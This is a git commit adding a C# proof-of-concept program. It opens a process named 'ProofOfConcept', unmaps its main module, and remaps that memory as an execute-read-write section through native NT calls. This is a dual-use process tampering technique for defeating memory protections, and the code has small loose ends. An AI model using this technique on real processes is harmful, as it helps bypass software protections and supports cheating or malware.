6e7b48230499bc1e2472a7cabccf5ae0540c41b9
Evulpes <54101182+Evulpes@users.noreply.github.com>
2020-04-01 17:17:59 +0100

    Add project files.

---
+++ Program.cs
@@ -0,0 +1,88 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Linq;
+
+namespace Remap_Memory_Region
+{
+    class Program : NativeMethods
+    {
+        static void Main(string[] args)
+        {
+            Process process = Process.GetProcessesByName("ProofOfConcept").FirstOrDefault();
+            IntPtr hProcess = OpenProcess(ProcessAccessFlags.PROCESS_ALL_ACCESS, false, process.Id);
+
+            if (hProcess == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed on OpenProcess. Handle is invalid.");
+                return;
+            }
+
+            if (VirtualQueryEx(hProcess, process.MainModule.BaseAddress, out MEMORY_BASIC_INFORMATION basicInformation, Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) == 0)
+            {
+                Console.WriteLine("Failed on VirtualQueryEx. Return is 0 bytes.");
+                return;
+            }
+            IntPtr regionBase = basicInformation.baseAddress;
+            IntPtr regionSize = basicInformation.regionSize;
+            NtSuspendProcess(hProcess);
+            RemapMemoryRegion(hProcess, regionBase, regionSize.ToInt32(), MemoryProtectionConstraints.PAGE_WRITECOMBINE);            //MISSING VIRTUALALLOC
+            NtResumeProcess(hProcess);
+            CloseHandle(hProcess);
+
+        }
+        public static bool RemapMemoryRegion(IntPtr processHandle, IntPtr baseAddress, int regionSize, MemoryProtectionConstraints mapProtection)
+        {
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, regionSize, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtectionConstraints.PAGE_EXECUTE_READWRITE);
+            if (addr == IntPtr.Zero)
+                return false;
+
+            IntPtr copyBuf = VirtualAlloc(IntPtr.Zero, regionSize, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtectionConstraints.PAGE_EXECUTE_READWRITE);
+
+            if (!ReadProcessMemory(processHandle, baseAddress, copyBuf, regionSize, out IntPtr bytes))
+                return false;
+            
+            IntPtr sectionHandle = default;
+            long sectionMaxSize = regionSize;
+
+            
+            Ntstatus status = NtCreateSection(ref sectionHandle, AccessMask.SECTION_ALL_ACCESS, IntPtr.Zero, ref sectionMaxSize, MemoryProtectionConstraints.PAGE_EXECUTE_READWRITE, SectionProtectionConstraints.SEC_COMMIT, IntPtr.Zero);
+            
+            if (status != Ntstatus.STATUS_SUCCESS)
+                return false;
+
+            status = NtUnmapViewOfSection(processHandle, baseAddress);
+
+            if (status != Ntstatus.STATUS_SUCCESS)
+                return false;
+
+
+
+            IntPtr viewBase = baseAddress;
+            long sectionOffset = default;
+            uint viewSize = 0;
+            status = NtMapViewOfSection(sectionHandle,
+                                               processHandle,
+                                               ref viewBase,
+                                               UIntPtr.Zero,
+                                               regionSize,
+                                               ref sectionOffset,
+                                               ref viewSize,
+                                               2,
+                                               0,
+                                               MemoryProtectionConstraints.PAGE_EXECUTE_READWRITE);
+
+            if (status != Ntstatus.STATUS_SUCCESS)
+                return false;
+
+            if (!WriteProcessMemory(processHandle, viewBase, copyBuf, (int)viewSize, out bytes))
+                return false;
+
+            if(!VirtualFree(copyBuf, 0, MemFree.MEM_RELEASE))
+                return false;
+
+            return true;
+
+        }
+    }
+}
